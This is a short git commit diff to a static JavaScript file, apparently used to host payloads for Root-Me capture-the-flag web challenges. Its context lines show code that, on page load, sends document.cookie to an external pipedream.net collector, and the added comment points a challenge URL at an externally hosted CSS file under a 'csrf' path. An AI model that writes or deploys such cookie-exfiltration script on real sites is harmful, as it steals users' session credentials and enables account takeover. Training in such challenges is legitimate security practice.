31c84e6515bfb2d9fa29c362c2ec88597a2b2af9
asbilim <bilimdepaullilian@gmail.com>
2024-09-13 03:24:14 +0100

    going to prod

--- staticfiles/ch62/script.js
+++ staticfiles/ch62/script.js
@@ -3,3 +3,5 @@ document.addEventListener("DOMContentLoaded", function () {
     `https://eni8dd83qy2yp.x.pipedream.net?data=${document.cookie}`
   );
 });
+
+//http://challenge01.root-me.org:58005/?style=https://rootme237.onrender.com/web-client/css/csrf
